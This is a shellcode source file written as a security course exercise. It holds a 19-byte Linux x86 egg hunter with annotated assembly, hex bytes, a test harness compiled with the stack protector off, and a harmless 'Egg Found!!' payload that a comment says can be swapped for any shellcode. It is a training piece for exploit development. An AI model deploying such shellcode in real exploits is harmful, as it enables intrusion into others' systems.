/*
Title: Linux x86 Egg Hunter Shellcode (19 bytes)
Date: 4 August 2015
Author: Guillaume Kaddouch
    Website: http://networkfilter.blogspot.com
    Twitter: @gkweb76
Tested on: Ubuntu 14.04.2 LTS x86, Kali Linux 1.0.9 x86

This code was created as an exercise for the SecurityTube Linux Assembly Expert (SLAE).

Egg signature = 0x50905090 (push eax, nop, push eax, nop)
Usually egg hunters use a 2 * 4 bytes (8 bytes) egg because the first address check could match the hardcoded egg signature in
the egg hunter itself. As we do not store hardcoded egg signature below, it allows us to check only 4 bytes once.

egg-hunter.asm:
----------------

global _start

section .text

_start:
        mov eax, addr                   ; retrieve a valid address (shorter than using JMP CALL POP)
        mov ebx, dword 0x5090508f       ; egg signature altered: 0x50905090 - 1
        inc ebx                         ; fix egg signature in ebx (the purpose is to not store the hardcoded egg signature)

next_addr:
        inc eax                         ; increasing memory address to look at next address
        cmp dword [eax], ebx            ; check if our egg is at that memory address, if yes set ZF = 1
        jne next_addr                   ; if ZF = 0 (check failed), then jump to next_addr to check next address
        jmp eax                         ; we found our egg (ZF = 1), jump at this address

        addr: db 0x1
*/

/*
myegg.c:
-----------
Compile with: gcc -fno-stack-protector -z execstack myegg.c -o myegg
*/

#include<stdio.h>
#include<string.h>

// Egg hunter 19 bytes (\x00 \x0a \x0d free)
unsigned char egghunter[] = \
"\xb8\x72\x80\x04\x08\xbb\x8f\x50\x90\x50\x43\x40\x39\x18\x75"
"\xfb\xff\xe0\x01";

// Print 'Egg Found!!' on screen
// You can swap it out with any shellcode you like (as long as you keep the egg mark)
unsigned char shellcode[] = \
"\x90\x50\x90\x50" // egg mark
"\xeb\x16\x59\x31\xc0\x50\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2"
"\x0c\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe5\xff\xff\xff\x45"
"\x67\x67\x20\x46\x6f\x75\x6e\x64\x21\x21\x0a";

main()
{
        printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
        int (*ret)() = (int(*)())egghunter;
        ret();
}